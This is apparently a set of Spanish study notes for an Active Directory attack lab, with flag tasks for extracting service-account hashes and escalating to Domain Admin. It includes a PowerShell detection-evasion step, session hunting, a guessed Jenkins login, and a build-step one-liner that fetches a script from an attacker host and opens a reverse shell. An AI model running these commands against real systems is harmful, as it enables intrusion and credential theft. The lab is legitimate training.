## Tareas
- [ ]  Identifique una maquina en el dominio de destino donde haya una sesión de administrador de dominio disponible
- [ ] Comprometer la maquina y elevar privilegios a Administrador de dominio abusando de una reverse shell en dcorp-ci
- [ ] Escalar privilegios a Domain Admin abusando de la administración local derivada a través de dcorp-adminsrv. En dcorp-adminsrv listar la lista de permisos de la aplicaion
	- [ ] Lagunas en las reglas de Applocker
	- [ ] Deshabilitar Applocker modificando la GPO aplicable

**Flag 10: Proceso que usa svcadmin como cuenta de servicio en dcorp-mgmt**
**Flag 11: Hash NTL de la cuenta scvadmin en dcorp-mgmt**
**Flag 12: Intentamos extraer credenciales en texto plano para tareas programas el valor de la flag es similar a lsass, registry, credential vault, etc**
**Flag 13: Hash NTLM de srvadmin extraído de dcorp-adminsrv**
**Flag 14: Hash NTLM de websvc extraído de dcorp-adminsrv**
**Flag 15: Hash NTLM de appadmin extraído de dcorp-adminsrv**


## Solución 1, Identificar una maquina en el dominio destino donde haya una sesión de administrador disponible
Primero deberemos de ejecutar *InviShell* para poder eludir las detecciones de PowerShell y poder ejecutar este de forma mas sigilosa
```shell
.\InviShell\RunWithRegistryNonAdmin.bat  
```

Y después podremos ejecutar *PowerView*
```shell
. .\PowerView.ps1 
```

Verificaremos que la sesión de administrador de dominio esta disponible, para ello primero tendremos que usar *SessionHunter*
```shell
. C:\AD\Tools\Invoke-SessionHunter.ps1
```

Enumeraremos los usuarios con la sesión activa y si tenemos acceso a esos usuarios con 
```shell
Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
```

Viendo usuarios como
```shell
dcorp-adminsrv dcorp\appadmin              True
dcorp-adminsrv dcorp\srvadmin              True
dcorp-adminsrv dcorp\websvc                True
```

También los podemos listar de una lista de servidores ya guardada
```shell
Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access
```

## Solución 2, Comprometer la maquina y elevar privilegios a Administrador de Dominio abusando de una reverse shell en dcorp-ci

Realizaremos los mismos pasos de obtener una Reverse Shell igual que hemos hecho con el [[Laboratorio 05]] aprovechándonos de una vulnerabilidad en Jenkins

Accederemos al servidor de Jenkins que conocemos que se haya en la IP *172.16.3.11:8080*
Nos encontramos que es la versión *2.361.4*, en el panel de People podemos enumerar tres cuentas y antes de hacer fuerza bruta probaremos entre ellas a usar *User as Password* en este caso *builduser::builduser* en el panel de login

Con este usuario se nos permite modificar un proyecto ya existente en la modificación de este, procederemos a acceder a *Configure* -> *Add build step*
Una vez en esa zona de configuracion nos mandaremos una reverse shell a nuetsra maquina
```shell
powershell iex (iwr -UseBasicParsing http://<attacker_machine>/Invoke-PowershellTcp.ps1);power -Reverse -IPAddress <attacker_machine> -Port 1339
```

Una vez tenemos introducido el reverse shell lo guardaremos y ejecutaremos *netcat* poniendonos en escucha en el puerto selecciona
```shell
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 1339
```

Ejecutaremos *hsf.exe* y cargaremos *Invoke-PowerShellTcp.ps1*
Y copiaremos la URL ahora en Jenkins haremos clic en Buid Now